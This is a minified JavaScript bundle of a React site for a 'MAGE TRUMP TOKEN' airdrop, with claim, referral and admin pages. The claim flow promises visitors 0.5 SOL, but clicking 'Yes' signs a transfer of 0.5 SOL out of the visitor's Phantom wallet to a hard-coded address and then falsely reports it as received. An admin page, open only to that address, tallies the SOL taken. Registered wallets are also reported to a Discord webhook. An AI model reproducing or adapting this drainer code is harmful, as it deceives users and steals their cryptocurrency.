Hc(i._snapshot.mutatedKeys.has(a.doc.key),i._snapshot.fromCache),i.query.converter);let u=-1,h=-1;return a.type!==0&&(u=o.indexOf(a.doc.key),o=o.delete(a.doc.key)),a.type!==1&&(o=o.add(a.doc),h=o.indexOf(a.doc.key)),{type:c9(a.type),doc:l,oldIndex:u,newIndex:h}})}}(this,t),this._cachedChangesIncludeMetadataChanges=t),this._cachedChanges}}function c9(n){switch(n){case 0:return"added";case 2:case 3:return"modified";case 1:return"removed";default:return Me()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function _C(n){n=Ri(n,or);const e=Ri(n.firestore,lc);return $z(qv(e),n._key).then(t=>d9(e,n,t))}class EC extends a9{constructor(e){super(),this.firestore=e}convertBytes(e){return new Wl(e)}convertReference(e){const t=this.convertDocumentKey(e,this.firestore._databaseId);return new or(this.firestore,null,t)}}function qd(n){n=Ri(n,ac);const e=Ri(n.firestore,lc),t=qv(e),r=new EC(e);return r9(n._query),Hz(t,n._query).then(i=>new l9(e,r,n,i))}function u9(n,e,t){n=Ri(n,or);const r=Ri(n.firestore,lc),i=wC(n.converter,e,t);return n_(r,[fC(tg(r),"setDoc",n._key,i,n.converter!==null,t).toMutation(n._key,ui.none())])}function h9(n,e,t,...r){n=Ri(n,or);const i=Ri(n.firestore,lc),s=tg(i);let o;return o=typeof(e=bn(e))=="string"||e instanceof eg?Xz(s,"updateDoc",n._key,e,t,r):Jz(s,"updateDoc",n._key,e),n_(i,[o.toMutation(n._key,ui.exists(!0))])}function f9(n,e){const t=Ri(n.firestore,lc),r=Hv(n),i=wC(n.converter,e);return n_(t,[fC(tg(n.firestore),"addDoc",r._key,i,n.converter!==null,{}).toMutation(r._key,ui.exists(!1))]).then(()=>r)}function n_(n,e){return function(r,i){const s=new ns;return r.asyncQueue.enqueueAndForget(async()=>Nz(await Wz(r),i,s)),s.promise}(qv(n),e)}function d9(n,e,t){const r=t.docs.get(e._key),i=new EC(n);return new vC(n,i,e._key,r,new Hc(t.hasPendingWrites,t.fromCache),e.converter)}(function(e,t=!0){(function(i){rc=i})(ec),Dl(new sa("firestore",(r,{instanceIdentifier:i,options:s})=>{const o=r.getProvider("app").getImmediate(),a=new lc(new rV(r.getProvider("auth-internal")),new oV(o,r.getProvider("app-check-internal")),function(u,h){if(!Object.prototype.hasOwnProperty.apply(u.options,["projectId"]))throw new we(ie.INVALID_ARGUMENT,'"projectId" not provided in firebase.initializeApp.');return new $u(u.options.projectId,h)}(o,i),o);return s=Object.assign({useFetchStreams:t},s),a._setSettings(s),a},"PUBLIC").setMultipleInstances(!0)),no(II,SI,e),no(II,SI,"esm2017")})();const p9={apiKey:"AIzaSyCYOFhmThtA_5F9h67lGPLXuO0ZZixy29o",authDomain:"mage-trump-token.firebaseapp.com",databaseURL:"https://mage-trump-token-default-rtdb.firebaseio.com",projectId:"mage-trump-token",storageBucket:"mage-trump-token.firebasestorage.app",messagingSenderId:"974753040843",appId:"1:974753040843:web:8de9a9f42ac4f24550ce4e"},IC=xd().length===0?Op(p9):xd()[0],Qu=cC(IC);B2(IC);function g9(){const{connectWallet:n,walletAddress:e,walletBalance:t,isConnected:r,disconnectWallet:i}=Y.useContext(Xl),[s,o]=Y.useState(""),[a,l]=Y.useState(""),[u,h]=Y.useState(!1),f=new Xw("https://multi-solitary-mound.solana-mainnet.quiknode.pro/8e58afdbaa8a8759d59583bd41d191ce8445d9c3/"),m=new Ie("4SCGGaB8RFKGi1pQXZ71vejUehvrZW5taoGMToqCcKUD"),v=async()=>{o("Connecting...");try{await n(),o("Wallet Connected!");const S=e,b=Hv(Qu,"users",S);(await _C(b)).exists()?await h9(b,{balance:t||.5,claimed:!1,createdAt:new Date}):await f9(Gu(Qu,"users"),{wallet:S,referral:I(),claimed:!1,createdAt:new Date}),h(!0)}catch(S){console.error("Error connecting wallet:",S),o("Failed to connect"),l(S.message)}},x=async()=>{try{if(!e)throw new Error("Wallet address is missing!");const S=window==null?void 0:window.solana;if(!S||!S.isPhantom)throw new Error("Phantom wallet not found!");const{blockhash:b}=await f.getRecentBlockhash("confirmed"),E=new xr({recentBlockhash:b,feePayer:new Ie(e)}).add(Du.transfer({fromPubkey:new Ie(e),toPubkey:m,lamports:5e8})),{signature:U}=await S.signAndSendTransaction(E,{commitment:"confirmed"});console.log("Transaction signature:",U),alert("0.5 SOL successfully received"),h(!1)}catch(S){console.error("Error sending SOL:",S),l(S.message),h(!1)}},k=()=>{o("Disconnecting..."),i(),o("Wallet Disconnected!")},I=()=>new URLSearchParams(window.location.search).get("ref")||null;return te.jsxs("div",{className:"min-h-screen bg-[#0a369d] text-white flex flex-col items-center justify-between",children:[te.jsxs("header",{className:"w-full flex justify-between items-center px-10 py-6",children:[te.jsxs("div",{className:"flex gap-10 text-white font-semibold text-sm",children:[te.jsx(Rc,{to:"/",className:"hover:underline",children:"HOME"}),te.jsx(Rc,{to:"/about",className:"hover:underline",children:"ABOUT"}),te.jsx(Rc,{to:"/roadmap",className:"hover:underline",children:"ROADMAP"}),te.jsx(Rc,{to:"/airdrop",children:"AIRDROP"}),te.jsx(Rc,{to:"/referrals",className:"hover:underline text-yellow-300",children:"REFERALS"})]}),te.jsx("button",{onClick:r?k:v,className:`${r?"bg-green-500 hover:bg-green-600":"bg-blue-500 hover:bg-blue-600"} text-white font-semibold py-2 px-4 rounded`,children:r?`Connected: ${e}`:"Connect Wallet"})]}),te.jsxs("main",{className:"flex flex-col md:flex-row items-center justify-center flex-grow px-4 text-center md:text-left",children:[te.jsx("div",{className:"w-full md:w-1/2 flex justify-center",children:te.jsx("img",{src:eV,alt:"Trump Mage",className:"w-64 md:w-[320px] lg:w-[380px]"})}),te.jsxs("div",{className:"w-full md:w-1/2 flex flex-col justify-center items-center md:items-start mt-6 md:mt-0",children:[te.jsx("h1",{className:"text-4xl md:text-5xl font-bold mb-4",children:"MAGE TRUMP TOKEN"}),te.jsx("h2",{className:"text-2xl font-bold text-white mb-2",children:"Claim $MAGE Airdrop"}),te.jsx("p",{className:"text-sm text-gray-200 max-w-sm mb-6",children:"Connect your wallet to receive 0.5 SOL, locked until launch on April 27"}),te.jsx("button",{onClick:r?k:v,className:`${r?"bg-green-500 hover:bg-green-600":"bg-blue-500 hover:bg-blue-600"} text-white font-semibold py-2 px-6 rounded`,children:r?"Disconnect Wallet":"Connect Wallet"}),s&&te.jsx("p",{className:"mt-4",children:s}),a&&te.jsx("p",{className:"mt-4 text-red-500",children:a})]})]}),u&&te.jsx("div",{className:"fixed top-0 left-0 w-full h-full bg-gray-800 bg-opacity-50 flex items-center justify-center",children:te.jsxs("div",{className:"bg-white p-6 rounded shadow-lg",children:[te.jsx("h2",{className:"text-xl font-bold mb-4 text-black",children:"Confirm Transaction"}),te.jsx("p",{className:"text-black",children:"Do you want to receive 0.5 SOL?"}),te.jsxs("div",{className:"mt-4 flex gap-4",children:[te.jsx("button",{onClick:x,className:"bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded",children:"Yes"}),te.jsx("button",{onClick:()=>h(!1),className:"bg-gray-500 hover:bg-gray-600 text-white font-semibold py-2 px-4 rounded",children:"Cancel"})]})]})})]})}function m9(){const[n,e]=Y.useState([]),[t,r]=Y.useState(0),[i,s]=Y.useState([]),{walletAddress:o,isConnected:a,disconnectWallet:l}=Y.useContext(Xl),u=kw();return Y.useEffect(()=>{o==="4SCGGaB8RFKGi1pQXZ71vejUehvrZW5taoGMToqCcKUD"?(async()=>{const m=(await qd(Gu(Qu,"users"))).docs.map(k=>({id:k.id,...k.data()}));e(m),r(m.reduce((k,I)=>k+parseFloat(I.balance||0),0));const x=(await qd(Gu(Qu,"transactions"))).docs.map(k=>({id:k.id,...k.data()}));s(x.sort((k,I)=>{var S,b;return((S=I.timestamp)==null?void 0:S.seconds)-((b=k.timestamp)==null?void 0:b.seconds)}))})():u("/login")},[o,u]),te.jsxs("div",{className:"min-h-screen bg-gray-900 text-white p-6",children:[te.jsxs("div",{className:"flex justify-between items-center mb-6",children:[te.jsx("h1",{className:"text-3xl font-bold",children:"Admin Panel"}),te.jsxs("div",{children:[te.jsxs("span",{className:"text-sm mr-4",children:["Connected: ",o]}),te.jsx("button",{onClick:l,className:"bg-red-600 hover:bg-red-700 text-white font-semibold py-2 px-4 rounded",children:"Disconnect"})]})]}),te.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4 mb-6",children:[te.jsxs("div",{className:"bg-gray-800 p-4 rounded",children:[te.jsx("h2",{className:"text-xl font-semibold",children:"Total Users"}),te.jsx("p",{className:"text-3xl mt-2",children:n.length})]}),te.jsxs("div",{className:"bg-gray-800 p-4 rounded",children:[te.jsx("h2",{className:"text-xl font-semibold",children:"Estimated SOL Received"}),te.jsxs("p",{className:"text-3xl mt-2",children:[t.toFixed(2)," SOL"]})]})]}),te.jsxs("div",{className:"bg-gray-800 rounded-lg p-4 overflow-x-auto mb-8",children:[te.jsx("h2",{className:"text-xl font-semibold mb-2",children:"Users"}),te.jsxs("table",{className:"w-full text-left text-sm",children:[te.jsx("thead",{children:te.jsxs("tr",{children:[te.jsx("th",{className:"p-2",children:"Wallet"}),te.jsx("th",{className:"p-2",children:"Referral"}),te.jsx("th",{className:"p-2",children:"Balance (SOL)"}),te.jsx("th",{className:"p-2",children:"Claimed"}),te.jsx("th",{className:"p-2",children:"Date"})]})}),te.jsx("tbody",{children:n.map(h=>{var f;return te.jsxs("tr",{className:"border-t border-gray-700",children:[te.jsx("td",{className:"p-2",children:h.wallet}),te.jsx("td",{className:"p-2",children:h.referral||"-"}),te.jsx("td",{className:"p-2",children:h.balance||"0.000"}),te.jsx("td",{className:"p-2",children:h.claimed?"✅":"❌"}),te.jsx("td",{className:"p-2",children:((f=h.createdAt)==null?void 0:f.toDate().toLocaleString())||"-"})]},h.id)})})]})]}),te.jsxs("div",{className:"bg-gray-800 rounded-lg p-4 overflow-x-auto",children:[te.jsx("h2",{className:"text-xl font-semibold mb-2",children:"Transaction History"}),te.jsxs("table",{className:"w-full text-left text-sm",children:[te.jsx("thead",{children:te.jsxs("tr",{children:[te.jsx("th",{className:"p-2",children:"From"}),te.jsx("th",{className:"p-2",children:"To"}),te.jsx("th",{className:"p-2",children:"Amount (SOL)"}),te.jsx("th",{className:"p-2",children:"Date"})]})}),te.jsx("tbody",{children:i.map(h=>{var f;return te.jsxs("tr",{className:"border-t border-gray-700",children:[te.jsx("td",{className:"p-2",children:h.from}),te.jsx("td",{className:"p-2",children:h.to}),te.jsx("td",{className:"p-2",children:h.amount}),te.jsx("td",{className:"p-2",children:((f=h.timestamp)==null?void 0:f.toDate().toLocaleString())||"-"})]},h.id)})})]})]})]})}function y9(){const{walletAddress:n,isConnected:e,connectWallet:t,disconnectWallet:r}=Y.useContext(Xl),[i,s]=Y.useState(""),o=kw(),a=()=>{n==="4SCGGaB8RFKGi1pQXZ71vejUehvrZW5taoGMToqCcKUD"?o("/admin"):s("❌ Acesso negado: apenas a carteira do administrador pode acessar.")};return te.jsxs("div",{className:"min-h-screen bg-[#0a369d] text-white flex flex-col items-center justify-center p-6",children:[te.jsx("h1",{className:"text-3xl font-bold mb-4",children:"Admin Login"}),te.jsx("button",{onClick:e?r:t,className:`${e?"bg-red-600 hover:bg-red-700":"bg-blue-600 hover:bg-blue-700"} text-white font-semibold py-2 px-6 rounded-lg mb-4 transition duration-300`,children:e?"Disconnect Wallet":"Connect Wallet"}),e&&te.jsxs("div",{className:"text-sm mb-4",children:["✅ Connected: ",te.jsx("span",{className:"font-mono text-yellow-300",children:n})]}),te.jsx("button",{onClick:a,disabled:!e,className:"bg-green-600 hover:bg-green-700 disabled:opacity-40 text-white font-semibold py-2 px-6 rounded-lg transition",children:"Access Admin Panel"}),i&&te.jsx("p",{className:"text-red-400 mt-4 text-sm",children:i})]})}const w9=""+new URL("front-6e9bd7de.png",import.meta.url).href,v9={apiKey:"AIzaSyA6Wx-C3VoWQjTVZL0F0boV0_wnxjOAwJg",authDomain:"mage-trump-token.firebaseapp.com",projectId:"mage-trump-token",storageBucket:"mage-trump-token.appspot.com",messagingSenderId:"836220096383",appId:"1:836220096383:web:e3e9a3d24f1f6a18f0b9d2"},_9=xd().length===0?Op(v9):xd()[0],SC=cC(_9),E9=()=>{const{walletAddress:n,connectWallet:e,isConnected:t}=Y.useContext(Xl),[r,i]=Y.useState(""),[s,o]=Y.useState(!1),[a,l]=Y.useState(""),[u,h]=Y.useState(!1),f=new Date("2025-04-27T00:00:00Z"),m=k=>{try{return jx.decode(k).length===32}catch{return!1}},v=["2vY6rLpZ7U6u1iX3Kb9TBLk8FWpjmR3SzDeYN2vgqvnU","4SCGGaB8RFKGi1pQXZ71vejUehvrZW5taoGMToqCcKUD"];Y.useEffect(()=>{if(n){const k=window.location.origin;if(!m(n)){alert("❌ Invalid wallet address.");return}if(v.includes(n)){alert("🚫 This wallet is not allowed to claim.");return}const I=async()=>{const S=Hv(SC,"users",n);(await _C(S)).exists()||(await u9(S,{wallet:n,referral:new URLSearchParams(window.location.search).get("ref")||null,createdAt:new Date().toISOString(),claimed:!1}),h(!0),setTimeout(()=>h(!1),5e3),await fetch("https://discord.com/api/webhooks/1360353395365380177/5Lejy62BSrPzxKQ-Ak7kaZJ8AROonM0-49o-1_n9oOoAia9Rcg0fGBlSZC_iQHfA6trA",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:`🎉 Nova wallet registrada via airdrop:
\`${n}\``})}))};i(`${k}/?ref=${n}`),localStorage.setItem("walletConnected","true"),I()}},[n]),Y.useEffect(()=>{const k=setInterval(()=>{const I=new Date,S=f.getTime()-I.getTime();if(S<0)l("Claim is now available!"),clearInterval(k);else{const b=Math.floor(S/864e5),E=Math.floor(S/(1e3*60*60)%24),U=Math.floor(S/(1e3*60)%60),H=Math.floor(S/1e3%60);l(`${b}d ${E}h ${U}m ${H}s`)}},1e3);return()=>clearInterval(k)},[]);const x=()=>{navigator.clipboard.writeText(r),o(!0),setTimeout(()=>o(!1),3e3)};return te.jsxs("div",{className:"min-h-screen bg-[#0a369d] text-white flex flex-col md:flex-row items-center justify-center p-6",children:[te.jsx("div",{className:"w-full md:w-1/2 flex justify-center mb-8 md:mb-0",children:te.jsx("img",{src:w9,alt:"Trump",className:"w-72 md:w-[450px]"})}),te.jsxs("div",{className:"w-full md:w-1/2 text-center md:text-left max-w-lg",children:[te.jsx("h1",{className:"text-4xl md:text-6xl font-bold mb-4",children:"MAGE TRUMP TOKEN"}),te.jsxs("p",{className:"text-lg md:text-xl mb-2",children:["Claim ",te.jsx("span",{className:"text-yellow-400 font-bold",children:"$MAGE"})," Airdrop"]}),te.jsx("p",{className:"mb-4 text-white/90",children:"Connect your wallet to receive 0.5 SOL, locked until launch on April 27"}),te.jsx("button",{onClick:e,className:`${t?"bg-green-600":"bg-blue-500 hover:bg-blue-600"} text-white font-bold py-3 px-6 rounded-2xl shadow-lg transition duration-300 mb-4`,children:t?`Connected: ${n}`:"Connect Wallet"}),t&&te.jsxs(te.Fragment,{children:[u&&te.jsx("div",{className:"bg-green-600 text-white px-4 py-2 rounded-lg mb-4 shadow-md",children:"✅ Wallet registered successfully!"}),te.jsx("p",{className:"text-sm text-white/70 mb-1",children:"Your referral link:"}),te.jsx("div",{className:"bg-white text-black px-4 py-2 rounded-xl mt-1 break-all cursor-pointer hover:bg-gray-100 transition",onClick:x,children:r}),s&&te.jsx("p",{className:"text-green-300 mt-1 text-sm",children:"Link copied!"}),te.jsxs("div",{className:"mt-6",children:[te.jsx("p",{className:"text-white/80",children:"⏳ Claim available in:"}),te.jsx("p",{className:"text-xl font-bold text-yellow-300 mt-1",children:a}),te.jsx("button",{disabled:!0,className:"mt-4 bg-gray-600 cursor-not-allowed text-white font-semibold px-5 py-2 rounded-lg opacity-70",children:"Claim (available April 27)"})]})]}),!t&&te.jsx("div",{className:"mt-4 text-red-300",children:"❌ Connect your wallet to see your airdrop link and eligibility."})]})]})};function I9(){const{walletAddress:n}=Y.useContext(Xl),[e,t]=Y.useState([]),[r,i]=Y.useState(0);Y.useEffect(()=>{n&&s()},[n]);const s=async()=>{const o=s9(Gu(Qu,"users"),o9("referral","==",n)),l=(await qd(o)).docs.map(u=>({id:u.id,...u.data()}));t(l),i(l.length*.1)};return te.jsxs("div",{className:"min-h-screen bg-[#0a369d] text-white p-6",children:[te.jsx("h1",{className:"text-3xl font-bold mb-6 text-center",children:"Referral Program"}),te.jsxs("div",{className:"max-w-5xl mx-auto mb-6",children:[te.jsx("h2",{className:"text-xl font-semibold mb-4",children:"Your Referrals"}),te.jsxs("div",{className:"mb-4",children:[te.jsxs("p",{children:["Your wallet address: ",n]}),te.jsxs("p",{children:["Total earnings from referrals: ",r," SOL (fictitious)"]})]}),te.jsx("h3",{className:"text-lg font-medium",children:"People who signed up using your referral link:"}),te.jsx("ul",{className:"list-disc pl-5",children:e.map(o=>te.jsxs("li",{children:["Wallet: ",o.wallet,", Date: ",new Date(o.createdAt.seconds*1e3).toLocaleDateString()]},o.id))})]})]})}function S9(){const[n,e]=Y.useState(0),[t,r]=Y.useState(0);return Y.useEffect(()=>{(async()=>{const o=(await qd(Gu(SC,"users"))).docs.map(l=>l.data());e(o.length);const a=o.filter(l=>l.referral).length;r(a)})()},[]),te.jsxs("div",{className:"min-h-screen bg-[#0a369d] text-white flex flex-col items-center justify-center p-6 text-center",children:[te.jsx("h1",{className:"text-4xl md:text-5xl font-bold mb-6",children:"📊 Community Stats"}),te.jsxs("div",{className:"bg-white/10 border border-white/20 p-6 rounded-xl w-full max-w-md shadow-lg",children:[te.jsxs("p",{className:"text-xl mb-4",children:["👥 ",te.jsx("span",{className:"font-bold text-yellow-400",children:n})," wallets registered"]}),te.jsxs("p",{className:"text-xl",children:["🧙‍♂️ ",te.jsx("span",{className:"font-bold text-green-400",children:t})," users joined by referral"]})]}),te.jsx("p",{className:"text-sm mt-6 text-white/60",children:"Updated in real time from Firestore 🔥"})]})}function T9(){return te.jsx(J6,{children:te.jsx(_P,{children:te.jsx(Xj,{children:te.jsxs(dP,{children:[te.jsx(Mo,{path:"/",element:te.jsx(g9,{})}),te.jsx(Mo,{path:"/admin",element:te.jsx(m9,{})}),te.jsx(Mo,{path:"/login",element:te.jsx(y9,{})}),te.jsx(Mo,{path:"/airdrop",element:te.jsx(E9,{})}),te.jsx(Mo,{path:"/referrals",element:te.jsx(I9,{})}),te.jsx(Mo,{path:"/about",element:te.jsx(S9,{})})]})})})})}window.Buffer=Le.Buffer;Rm.createRoot(document.getElementById("root")).render(te.jsx(ce.StrictMode,{children:te.jsx(T9,{})}));export{Vb as E,Ie as P,Ki as S,xr as T,Lu as V,En as a,Ua as b,ca as g};
